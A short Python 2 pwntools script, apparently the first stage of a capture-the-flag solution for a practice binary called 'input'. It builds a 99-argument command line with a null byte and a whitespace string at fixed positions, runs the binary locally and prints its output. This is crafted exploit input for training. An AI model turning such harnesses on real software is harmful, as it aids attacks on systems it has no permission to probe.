#!/usr/bin/python

from pwn import *

# prepare payload
cmd = []
cmd.append('./input')
for num in range(1, 100):
    if num == 65:
        cmd.append('\x00')
    elif num == 66:
        cmd.append('\x20\x0a\x0d')
    else:
        cmd.append(str(num));
print '\ncmd: ', cmd

# open connection
conn = process(argv=cmd) # local process for debugging

# receive
#conn.sendline(payload)
print conn.recvline()
print conn.recvline()
print conn.recvline()
print conn.recvline()